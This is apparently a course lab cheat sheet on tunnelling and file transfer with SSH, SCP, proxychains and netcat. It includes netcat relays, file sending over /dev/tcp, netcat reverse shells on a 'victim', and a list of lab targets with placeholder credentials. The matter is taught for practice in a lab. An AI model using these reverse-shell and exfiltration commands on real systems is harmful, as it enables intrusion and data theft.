scp -P

----------------------------------------------------------------------------------------------------
SCP Syntax through a tunnel
Create a local port forward to target device
$ ssh student@172.16.82.106 -L 1111:localhost:22 -NT
Download a file from a remote directory to a local directory
$ scp -P 1111 student@localhost:secretstuff.txt /home/student
Upload a file to a remote directory from a local directory
$ scp -P 1111 secretstuff.txt student@localhost:/home/student

----------------------------------------------------------------------------------------------------
SCP Syntax through a Dynamic Port forward
Create a Dynamic Port Forward to target device
$ ssh student@172.16.82.106 -D 9050 -NT
Download a file from a remote directory to a local directory
$ proxychains scp student@localhost:secretstuff.txt .
Upload a file to a remote directory from a local directory
$ proxychains scp secretstuff.txt student@localhost:

----------------------------------------------------------------------------------------------------
NETCAT: Client to Listener file transfer
Listener (receive file):

nc -lvp 9001 > newfile.txt
Client (sends file):

nc 172.16.82.106 9001 < file.txt

----------------------------------------------------------------------------------------------------
NETCAT: Listener to Client file transfer
Listener (sends file):

nc -lvp 9001 < file.txt
Client (receive file):

nc 172.16.82.106 9001 > newfile.txt

----------------------------------------------------------------------------------------------------
NETCAT Relay Demos
Listener - Listener

On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
On Internet_Host (send):

$ nc 172.16.82.106 1111 < secret.txt
On Blue_Priv_Host-1 (receive):

$ nc 192.168.1.1 3333 > newsecret.txt

----------------------------------------------------------------------------------------------------
NETCAT Relay Demos
Client - Client

On Internet_Host (send):

$ nc -lvp 1111 < secret.txt
On Blue_Priv_Host-1 (receive):

$ nc -lvp 3333 > newsecret.txt
On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

----------------------------------------------------------------------------------------------------
NETCAT Relay Demos
Client - Listener

On Internet_Host (send):

$ nc -lvp 1111 < secret.txt
On Blue_Priv_Host-1 (receive):

$ nc 192.168.1.1 3333 > newsecret.txt
On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc 10.10.0.40 1111 < mypipe | nc -lvp 3333 > mypipe

----------------------------------------------------------------------------------------------------
NETCAT Relay Demos
Listener - Client

On Internet_Host (send):

$ nc 172.16.82.106 1111 < secret.txt
On Blue_Priv_Host-1 (receive):

$ nc -lvp 3333 > newsecret.txt
On Blue_Host-1 Relay:

$ mknod mypipe p
$ nc -lvp 1111 < mypipe | nc 192.168.1.10 3333 > mypipe

----------------------------------------------------------------------------------------------------
File Transfer with /dev/tcp
On the receiving box:

$ nc -lvp 1111 > devtcpfile.txt
On the sending box:

$ cat secret.txt > /dev/tcp/10.10.0.40/1111
This method is useful for a host that does not have NETCAT available.

----------------------------------------------------------------------------------------------------
Reverse shell using NETCAT
First listen for the shell on your device.

$ nc -lvp 9999
On Victim using -c :

$ nc -c /bin/bash 10.10.0.40 9999
On Victim using -e :

$ nc -e /bin/bash 10.10.0.40 9999

----------------------------------------------------------------------------------------------------
Target Section:

Task 1

T1
Hostname: INTERNET_HOST
External IP: 10.50.XXX.XXX (ALREADY PROVIDED) Internal IP: 10.10.0.40 (ALREADY PROVIDED) (accessed via FLOAT IP)
creds: student:password
Action: Successfully transfer file data between hosts via Netcat

T2
Hostname: BLUE_HOST-4
IP: 172.16.82.115
creds: (No Access)
Action: Successfully transfer files from this host using Netcat

RELAY
Hostname: BLUE_INT_DMZ_HOST-1
IP: 172.16.40.10
creds: student:password
Action: Successfully transfer file data between hosts via Netcat



Task 3

T3
Hostname: Atropia
IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: 22(ssh)
Action: Establish appropriate tunneling techniques

T4
Hostname: Pineland
IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: 23(telnet - go directly from T1 to T4 to simulate compromising the machine)
Type: Compromised Donovian System
Action: Establish appropriate tunneling techniques



Task 4
T5
Hostname: UNKNOWN
IP: 10.50.XXX.XXX (Will be Provided by Mission Command)
creds: netY_studentX:passwordX (netY = Networking Class Identifier & studentX = Student Number & passwordX = Student Number)
Known Ports: UNKNOWN
Action: Execute proper movement and redirection techniques
